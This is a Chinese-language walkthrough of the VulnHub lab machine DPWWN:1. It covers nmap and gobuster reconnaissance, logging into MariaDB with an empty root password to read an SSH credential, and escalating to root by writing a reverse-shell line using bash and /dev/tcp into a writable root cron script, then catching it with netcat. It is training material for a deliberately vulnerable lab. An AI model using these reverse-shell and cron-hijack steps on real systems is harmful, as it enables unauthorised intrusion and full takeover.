# DPWWN:1主机渗透实现

- 靶机地址:https://www.vulnhub.com/entry/dpwwn-1,342/
- 下载地址:https://download.vulnhub.com/dpwwn/dpwwn-01.zip

## 信息收集:

### 主机发现:

- 当前IP段:`192.168.2.0/24`,当前主机IP:`192.168.2.2`

- ```shell
  └─$ sudo nmap -sn --min-rate 10000 192.168.2.1/24                       
  [sudo] password for kali: 
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-21 05:35 EDT
  Nmap scan report for 192.168.2.1
  Host is up (0.0045s latency).
  MAC Address: 00:50:56:C0:00:01 (VMware)
  Nmap scan report for 192.168.2.11
  Host is up (0.00018s latency).
  MAC Address: 00:0C:29:A5:89:FA (VMware)
  Nmap scan report for 192.168.2.254
  Host is up (0.000063s latency).
  MAC Address: 00:50:56:E4:FB:DB (VMware)
  Nmap scan report for 192.168.2.2
  Host is up.
  Nmap done: 256 IP addresses (4 hosts up) scanned in 13.31 seconds
  ```

- 靶机IP:`192.168.2.11`

### 端口扫描

- TCP端口扫描

- ```shell
  └─$ sudo nmap -sT --min-rate 10000 -p- 192.168.2.11 -oA Nmap-scan/sT
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-21 05:37 EDT
  Nmap scan report for 192.168.2.11
  Host is up (0.0025s latency).
  Not shown: 65532 closed tcp ports (conn-refused)
  PORT     STATE SERVICE
  22/tcp   open  ssh
  80/tcp   open  http
  3306/tcp open  mysql
  MAC Address: 00:0C:29:A5:89:FA (VMware)
  
  Nmap done: 1 IP address (1 host up) scanned in 9.57 seconds
  ```

- UDP端口扫描

- ```shell
  └─$ sudo nmap -sU --min-rate 10000 -p- 192.168.2.11 -oA Nmap-scan/sU
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-21 05:38 EDT
  Warning: 192.168.2.11 giving up on port because retransmission cap hit (10).
  Nmap scan report for 192.168.2.11
  Host is up (0.00077s latency).
  All 65535 scanned ports on 192.168.2.11 are in ignored states.
  Not shown: 65457 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
  MAC Address: 00:0C:29:A5:89:FA (VMware)
  
  Nmap done: 1 IP address (1 host up) scanned in 79.43 seconds                                                            
  ┌──(kali㉿kali)-[~/Desktop/walkthroughs/dpwwn1]
  └─$ sudo nmap -sU --min-rate 10000 --top-port 20  192.168.2.11 -oA Nmap-scan/sU
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-21 05:40 EDT
  Nmap scan report for 192.168.2.11
  Host is up (0.00029s latency).
  
  PORT      STATE         SERVICE
  53/udp    open|filtered domain
  67/udp    open|filtered dhcps
  68/udp    open|filtered dhcpc
  69/udp    closed        tftp
  123/udp   open|filtered ntp
  135/udp   closed        msrpc
  137/udp   open|filtered netbios-ns
  138/udp   open|filtered netbios-dgm
  139/udp   open|filtered netbios-ssn
  161/udp   open|filtered snmp
  162/udp   open|filtered snmptrap
  445/udp   open|filtered microsoft-ds
  500/udp   open|filtered isakmp
  514/udp   open|filtered syslog
  520/udp   open|filtered route
  631/udp   open|filtered ipp
  1434/udp  open|filtered ms-sql-m
  1900/udp  open|filtered upnp
  4500/udp  open|filtered nat-t-ike
  49152/udp closed        unknown
  MAC Address: 00:0C:29:A5:89:FA (VMware)
  
  Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds
  ```

### 服务及操作系统扫描

- ```shell
  └─$ sudo nmap -sC -sV -O -p22,80,3306 192.168.2.11 -oA Nmap-scan/sC
  [sudo] password for kali: 
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-21 05:38 EDT
  Nmap scan report for 192.168.2.11
  Host is up (0.00050s latency).
  
  PORT     STATE SERVICE VERSION
  22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
  | ssh-hostkey: 
  |   2048 c1:d3:be:39:42:9d:5c:b4:95:2c:5b:2e:20:59:0e:3a (RSA)
  |   256 43:4a:c6:10:e7:17:7d:a0:c0:c3:76:88:1d:43:a1:8c (ECDSA)
  |_  256 0e:cc:e3:e1:f7:87:73:a1:03:47:b9:e2:cf:1c:93:15 (ED25519)
  80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
  |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
  | http-methods: 
  |_  Potentially risky methods: TRACE
  |_http-title: Apache HTTP Server Test Page powered by CentOS
  3306/tcp open  mysql   MySQL 5.5.60-MariaDB
  | mysql-info: 
  |   Protocol: 10
  |   Version: 5.5.60-MariaDB
  |   Thread ID: 5
  |   Capabilities flags: 63487
  |   Some Capabilities: ODBCClient, Speaks41ProtocolNew, InteractiveClient, LongColumnFlag, Support41Auth, SupportsTransactions, LongPassword, ConnectWithDatabase, Speaks41ProtocolOld, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, FoundRows, SupportsCompression, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
  |   Status: Autocommit
  |   Salt: [X,onYQkF[vbg_&=Bs@!
  |_  Auth Plugin Name: mysql_native_password
  MAC Address: 00:0C:29:A5:89:FA (VMware)
  Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
  Aggressive OS guesses: Linux 3.2 - 4.9 (98%), Linux 3.10 - 4.11 (94%), Linux 4.10 (94%), Linux 3.4 - 3.10 (94%), Synology DiskStation Manager 5.2-5644 (93%), Linux 3.18 (92%), Linux 3.13 - 3.16 (92%), Linux 2.6.32 (92%), Linux 4.15 - 5.8 (92%), Linux 2.6.32 - 3.10 (91%)
  No exact OS matches for host (test conditions non-ideal).
  Network Distance: 1 hop
  
  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 28.90 seconds
  ```

### 基础漏洞扫描

- ```shell
  └─$ sudo nmap --script=vuln -p22,80,3306 192.168.2.11 -oA Nmap-scan/Script
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-21 05:42 EDT
  Nmap scan report for 192.168.2.11
  Host is up (0.0011s latency).
  
  PORT     STATE SERVICE
  22/tcp   open  ssh
  80/tcp   open  http
  |_http-dombased-xss: Couldn't find any DOM based XSS.
  |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
  |_http-trace: TRACE is enabled
  |_http-csrf: Couldn't find any CSRF vulnerabilities.
  | http-enum: 
  |   /info.php: Possible information file
  |_  /icons/: Potentially interesting folder w/ directory listing
  3306/tcp open  mysql
  |_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
  MAC Address: 00:0C:29:A5:89:FA (VMware)
  
  Nmap done: 1 IP address (1 host up) scanned in 37.45 seconds
  ```

## web信息

- 首页为`apache2`的默认页
- ![image-20230821174327954](https://raw.githubusercontent.com/r0o983/images/main/202308211743131.png)

### gobuster扫描

- ```shell
  └─$ sudo gobuster dir -u http://192.168.2.11/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster -x txt,php,sql
  [sudo] password for kali: 
  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://192.168.2.11/
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Extensions:              txt,php,sql
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /info.php             (Status: 200) [Size: 47441]
  Progress: 882240 / 882244 (100.00%)
  ===============================================================
  Finished
  ===============================================================
  ```

- `info.php`页面

- ![image-20230821212708223](https://raw.githubusercontent.com/r0o983/images/main/202308212127330.png)

## 获得初始shell

- 尝试登录`mysql`数据库,由于当前没有任何的用户名以及密码,大部分配置不当的系统都会使用`root`作为用户名,尝试爆破

- 使用`空密码`成功进入数据库,并检索到`ssh`信息.

- ```mysql
  └─$ sudo mysql -h 192.168.2.11 -uroot -p
  Enter password: 
  Welcome to the MariaDB monitor.  Commands end with ; or \g.
  Your MariaDB connection id is 4
  Server version: 5.5.60-MariaDB MariaDB Server
  
  Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
  
  Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
  
  MariaDB [(none)]> show databases;
  +--------------------+
  | Database           |
  +--------------------+
  | information_schema |
  | mysql              |
  | performance_schema |
  | ssh                |
  +--------------------+
  4 rows in set (0.002 sec)
  
  MariaDB [(none)]> use ssh
  Reading table information for completion of table and column names
  You can turn off this feature to get a quicker startup with -A
  
  Database changed
  MariaDB [ssh]> show tables;
  +---------------+
  | Tables_in_ssh |
  +---------------+
  | users         |
  +---------------+
  1 row in set (0.000 sec)
  
  MariaDB [ssh]> select * from users;
  +----+----------+---------------------+
  | id | username | password            |
  +----+----------+---------------------+
  |  1 | mistic   | testP@$$swordmistic |
  +----+----------+---------------------+
  1 row in set (0.001 sec)
  
  MariaDB [ssh]> 
  
  ```

- 成功获得初始shell

- ```shell
  └─$ ssh mistic@192.168.2.11       
  The authenticity of host '192.168.2.11 (192.168.2.11)' can't be established.
  ED25519 key fingerprint is SHA256:gk40nSGfkMrCYAeMyL2l9aCwV/VL5i5mWKrFfowOfH0.
  This key is not known by any other names.
  Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
  Warning: Permanently added '192.168.2.11' (ED25519) to the list of known hosts.
  mistic@192.168.2.11's password: 
  Last login: Thu Aug  1 14:41:37 2019 from 192.168.30.145
  [mistic@dpwwn-01 ~]$ uname -a
  Linux dpwwn-01 3.10.0-957.el7.centos.plus.i686 #1 SMP Wed Nov 7 19:17:19 UTC 2018 i686 i686 i386 GNU/Linux
  [mistic@dpwwn-01 ~]$ ip a
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo
         valid_lft forever preferred_lft forever
      inet6 ::1/128 scope host 
         valid_lft forever preferred_lft forever
  2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
      link/ether 00:0c:29:a5:89:fa brd ff:ff:ff:ff:ff:ff
      inet 192.168.2.11/24 brd 192.168.2.255 scope global noprefixroute dynamic ens33
         valid_lft 1486sec preferred_lft 1486sec
      inet6 fe80::20c:29ff:fea5:89fa/64 scope link 
         valid_lft forever preferred_lft forever
  [mistic@dpwwn-01 ~]$ id
  uid=1000(mistic) gid=1000(mistic) groups=1000(mistic) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
  [mistic@dpwwn-01 ~]$ cat /etc/crontab 
  SHELL=/bin/bash
  PATH=/sbin:/bin:/usr/sbin:/usr/bin
  MAILTO=root
  
  # For details see man 4 crontabs
  
  # Example of job definition:
  # .---------------- minute (0 - 59)
  # |  .------------- hour (0 - 23)
  # |  |  .---------- day of month (1 - 31)
  # |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
  # |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
  # |  |  |  |  |
  # *  *  *  *  * user-name  command to be executed
  
  */3 *  * * *  root  /home/mistic/logrot.sh
  [mistic@dpwwn-01 ~]$ ls -lhai /home/mistic/logrot.sh 
  2536126 -rwx------. 1 mistic mistic 186 Aug  1  2019 /home/mistic/logrot.sh
  [mistic@dpwwn-01 ~]$ sudo -l
  
  We trust you have received the usual lecture from the local System
  Administrator. It usually boils down to these three things:
  
      #1) Respect the privacy of others.
      #2) Think before you type.
      #3) With great power comes great responsibility.
  
  [sudo] password for mistic: 
  Sorry, user mistic may not run sudo on dpwwn-01.
  [mistic@dpwwn-01 ~]$ 
  ```

## 提权:

- 通过查看定时任务发现有一项定时任务,每三分钟执行依次,在执行时拥有root权限,并且该文件的所有者为`mistic`,也就是当前用户,尝试直接在定时任务中写入提权脚本:`/bin/bash -c 'bash -i >& /dev/tcp/192.168.2.2/1234 0>&1'`

### 获得root权限

- 开启监听,等待反弹shell.

- ```shell
  └─$ sudo nc -nvlp 1234                                                    
  [sudo] password for kali: 
  listening on [any] 1234 ...
  connect to [192.168.2.2] from (UNKNOWN) [192.168.2.11] 53594
  bash: no job control in this shell
  [root@dpwwn-01 ~]# whoami
  whoami
  root
  [root@dpwwn-01 ~]# uname -a
  uname -a
  Linux dpwwn-01 3.10.0-957.el7.centos.plus.i686 #1 SMP Wed Nov 7 19:17:19 UTC 2018 i686 i686 i386 GNU/Linux
  [root@dpwwn-01 ~]# ls -lhai
  ls -lhai
  total 32K
  4214849 dr-xr-x---.  2 root root  182 Aug  1  2019 .
       64 dr-xr-xr-x. 17 root root  211 Aug  1  2019 ..
  4214851 -rw-------.  1 root root 1.4K Aug  1  2019 anaconda-ks.cfg
  4216146 -rw-------.  1 root root   14 Aug  1  2019 .bash_history
  4261510 -rw-r--r--.  1 root root   18 Dec 28  2013 .bash_logout
  4261511 -rw-r--r--.  1 root root  176 Dec 28  2013 .bash_profile
  4261512 -rw-r--r--.  1 root root  176 Dec 28  2013 .bashrc
  4261513 -rw-r--r--.  1 root root  100 Dec 28  2013 .cshrc
  4216147 -r-x------.  1 root root  171 Aug  1  2019 dpwwn-01-FLAG.txt
  4216567 -rw-------.  1 root root    0 Aug  1  2019 .mysql_history
  4261514 -rw-r--r--.  1 root root  129 Dec 28  2013 .tcshrc
  [root@dpwwn-01 ~]# cat dpwwn-01-FLAG.txt
  cat dpwwn-01-FLAG.txt 
  
  Congratulation! I knew you can pwn it as this very easy challenge. 
  
  Thank you. 
  
  
  64445777
  6e643634 
  37303737 
  37373665 
  36347077 
  776e6450 
  4077246e
  33373336 
  36359090
  [root@dpwwn-01 ~]# ip a
  ip a
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo
         valid_lft forever preferred_lft forever
      inet6 ::1/128 scope host 
         valid_lft forever preferred_lft forever
  2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
      link/ether 00:0c:29:a5:89:fa brd ff:ff:ff:ff:ff:ff
      inet 192.168.2.11/24 brd 192.168.2.255 scope global noprefixroute dynamic ens33
         valid_lft 1792sec preferred_lft 1792sec
      inet6 fe80::20c:29ff:fea5:89fa/64 scope link 
         valid_lft forever preferred_lft forever
  [root@dpwwn-01 ~]# 
  ```

